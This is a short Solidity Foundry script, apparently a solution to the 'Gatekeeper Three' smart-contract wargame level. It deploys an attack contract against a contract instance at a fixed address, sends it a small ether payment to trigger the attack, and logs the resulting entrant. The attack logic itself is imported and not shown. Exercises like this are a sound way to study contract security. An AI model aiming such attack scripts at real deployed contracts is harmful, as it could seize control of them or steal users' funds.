// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import "../src/GatekeeperThree.sol";

contract GatekeeperThreeScript is Script {
    function run() public {
        vm.startBroadcast();

        GatekeeperThree gatekeeper = GatekeeperThree(payable(0x65298E931cdF878E7964303857Bd3F28cDfB4c9d));
        GatekeeperThreeAttack attack = new GatekeeperThreeAttack(gatekeeper);

        address(attack).call{value: 0.0011 ether}(abi.encodeWithSignature("attack()"));

        console.log("entrant %s", gatekeeper.entrant());

        vm.stopBroadcast();
    }
}